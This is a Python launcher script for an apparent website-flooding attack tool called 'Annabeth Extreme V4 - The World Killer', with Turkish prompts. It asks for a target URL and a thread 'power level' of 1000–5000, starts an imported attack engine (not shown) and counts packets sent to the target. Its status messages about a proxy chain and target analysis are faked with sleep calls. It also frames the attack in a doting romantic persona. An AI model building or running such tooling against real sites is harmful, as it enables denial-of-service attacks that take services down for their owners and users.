import asyncio
import os
import sys
import time
from core.engine import AnnabethEngine
from colorama import Fore, init, Style

init(autoreset=True)


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""{Fore.RED}{Style.BRIGHT}
    ░█████╗░███╗░░██╗███╗░░██╗░█████╗░██████╗░███████╗████████╗██╗░░██╗
    ██╔══██╗████╗░██║████╗░██║██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██║░░██║
    ███████║██╔██╗██║██╔██╗██║███████║██████╔╝█████╗░░░░░██║░░░███████║
    ██╔══██║██║╚████║██║╚████║██╔══██║██╔══██╗██╔══╝░░░░░██║░░░██╔══██║
    ██║░░██║██║░╚███║██║░╚███║██║░░██║██████╔╝███████╗░░░██║░░░██║░░██║
    ╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░╚═╝
    {Fore.WHITE}       [--- ANNABETH EXTREME V4 - THE WORLD KILLER ---]
    {Fore.MAGENTA}          "Senin için dünyayı yakmaya geldim sevgilim..."
    """
    print(banner)


async def main():
    show_banner()

    target = input(f"{Fore.CYAN}[?] Hedef Site (Örn: https://target.com): {Fore.WHITE}")
    if not target.startswith("http"):
        print(f"{Fore.RED}[!] Geçersiz protokol. HTTP veya HTTPS kullanmalısın.")
        return

    threads = input(f"{Fore.CYAN}[?] Güç Seviyesi (Önerilen 1000-5000): {Fore.WHITE}")
    try:
        threads = int(threads)
    except:
        threads = 1000

    print(f"\n{Fore.YELLOW}[*] Sistem ön yüklemesi yapılıyor...")
    time.sleep(1)
    print(f"{Fore.YELLOW}[*] Proxy zinciri oluşturuldu...")
    time.sleep(1)
    print(f"{Fore.YELLOW}[*] Hedef analiz edildi: {target}")
    print(f"{Fore.GREEN}[+] Saldırı emri senin o güçlü ellerinle onaylandı. BAŞLATILIYOR!\n")

    engine = AnnabethEngine(target, threads)
    try:
        await engine.start()
    except KeyboardInterrupt:
        engine.is_running = False
        for t in engine.tasks: t.cancel()
        print(f"\n\n{Fore.RED}[!] Yıkım senin emrinle durduruldu.")
        print(f"{Fore.WHITE}Sonuç: {Fore.GREEN}{engine.total_packets} {Fore.WHITE}paket hedefe ulaştı.")
        print(f"{Fore.MAGENTA}Seni bekliyorum aşkım... Her zaman.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass